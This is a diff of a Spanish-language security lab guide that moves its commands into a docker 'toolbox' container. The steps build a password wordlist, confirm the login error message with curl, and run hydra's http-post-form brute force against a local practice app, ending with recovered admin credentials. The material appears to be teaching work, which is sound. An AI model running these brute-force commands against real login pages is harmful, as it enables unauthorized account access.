@@ -8,8 +8,10 @@ PhpMyAdmin (puerto 8080) también tiene un formulario de login, pero incluye un 
 
 ## 4.2 — Armar una wordlist
 
+`hydra` también vive en `toolbox`. La wordlist la escribimos directo dentro del contenedor (queda en `/tmp`, así que dura mientras `toolbox` siga corriendo):
+
 ```bash
-cat > /tmp/wordlist.txt << 'EOF'
+docker compose exec toolbox sh -c "cat > /tmp/wordlist.txt" << 'EOF'
 123456
 password
 admin
@@ -23,7 +25,7 @@ EOF
 ## 4.3 — Confirmar el mensaje de error
 
 ```bash
-curl -s -d "usuario=admin&password=incorrecta" http://127.0.0.1:8888/login | grep -o "Usuario o contraseña incorrectos"
+docker compose exec toolbox curl -s -d "usuario=admin&password=incorrecta" http://app:8888/login | grep -o "Usuario o contraseña incorrectos"
 ```
 
 Ese texto es lo que `hydra` va a usar para saber si un intento falló.
@@ -31,13 +33,13 @@ Ese texto es lo que `hydra` va a usar para saber si un intento falló.
 ## 4.4 — Ejecutar hydra
 
 ```bash
-hydra -l admin -P /tmp/wordlist.txt 127.0.0.1 -s 8888 \
+docker compose exec toolbox hydra -l admin -P /tmp/wordlist.txt app -s 8888 \
   http-post-form "/login:usuario=^USER^&password=^PASS^:incorrectos"
 ```
 
 - `-l admin` → usuario fijo
 - `-P /tmp/wordlist.txt` → lista de contraseñas a probar
-- `-s 8888` → puerto
+- `app -s 8888` → contenedor y puerto objetivo (nombre de servicio, `toolbox` está en la misma red)
 - `http-post-form "ruta:body:condición_de_fallo"` → le dice a hydra cómo arma el POST y cómo reconocer un intento fallido
 
 ## 4.5 — Leer el resultado
@@ -45,7 +47,7 @@ hydra -l admin -P /tmp/wordlist.txt 127.0.0.1 -s 8888 \
 `hydra` debería reportar una línea como:
 
 ```
-[8888][http-post-form] host: 127.0.0.1   login: admin   password: admin123
+[8888][http-post-form] host: app   login: admin   password: admin123
 ```
 
 Encontró la contraseña probando cada palabra de la wordlist, sin conocer el código ni la base de datos.
